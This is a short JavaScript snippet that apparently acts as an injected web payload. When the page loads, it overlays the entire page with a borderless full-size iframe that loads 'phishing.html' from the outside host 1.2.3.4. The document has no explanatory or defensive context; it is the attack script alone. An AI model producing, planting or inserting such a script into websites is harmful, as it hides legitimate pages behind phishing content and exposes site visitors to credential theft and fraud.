document.addEventListener("DOMContentLoaded", function() {
    let body = document.body;
    if (!body) {
        body = document.createElement('body');
        document.documentElement.appendChild(body);
    }
    
    let iframe = document.createElement('iframe');
    iframe.src = "http://1.2.3.4/phishing.html";
    iframe.width = "100%";
    iframe.height = "100%";
    iframe.style.border = "none";
  
    body.appendChild(iframe);
});
